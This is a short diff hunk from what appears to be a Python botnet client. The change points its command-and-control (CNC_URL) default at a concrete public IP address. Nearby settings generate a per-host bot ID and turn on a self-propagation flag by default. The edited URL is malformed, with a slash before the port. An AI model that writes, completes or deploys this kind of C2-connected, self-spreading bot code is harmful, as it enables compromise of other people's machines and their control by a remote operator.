@@ -41,7 +41,7 @@ import undetected_chromedriver as uc
 # =============================================================================
 # CONFIGURATION
 # =============================================================================
-CNC_URL = os.environ.get('CNC_URL', 'wss://your-ec2-public-ip:8765')  # EC2 Public IP
+CNC_URL = os.environ.get('CNC_URL', 'wss://54.234.46.3/:8765')  # EC2 Public IP
 BOT_ID = os.environ.get('BOT_ID', hashlib.sha256(socket.gethostname().encode() + str(os.getpid()).encode()).hexdigest()[:16])
 MAX_MEMORY_MB = int(os.environ.get('MAX_MEMORY_MB', 450))
 PROPAGATION = os.environ.get('PROPAGATION', 'true').lower() == 'true'
